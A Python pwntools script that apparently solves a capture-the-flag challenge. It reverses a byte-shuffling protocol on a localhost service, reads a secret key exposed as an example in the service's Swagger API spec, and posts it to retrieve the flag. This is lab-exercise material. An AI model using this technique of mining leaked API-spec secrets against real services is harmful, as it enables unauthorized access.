#!/usr/bin/env python3
from pwn import *
import json

def mix(data: bytearray):
  l, r = 1, 2
  while r < len(data):
    data[l], data[r] = data[r], data[l]
    l, r = l+r, r+l+r
  return data

def mixlines(data: bytearray):
  return b'\n'.join(map(mix, data.split(b'\n')))

def request(req):
  r = remote("localhost", 7070)
  r.send(mixlines(bytearray(req.encode())))
  result = mixlines(bytearray(r.recvall(timeout=1)))
  r.close()
  return result

spec = json.loads(request(
  f"GET /apispec_1.json HTTP/1.1\r\nHost: localhost:7070\r\nConnection: close\r\n\r\n"
).split(b"\r\n\r\n")[1])
flagpath = next(iter(spec["paths"].keys()))
secret = spec["paths"][flagpath]["post"]["parameters"][0]["example"]
flag = request(
  f"POST {flagpath} HTTP/1.1\r\nHost: localhost:7070\r\nConnection: close\r\nSecret-Key: {secret}\r\n\r\n"
).decode().split("\r\n\r\n")[1].strip()
print(flag)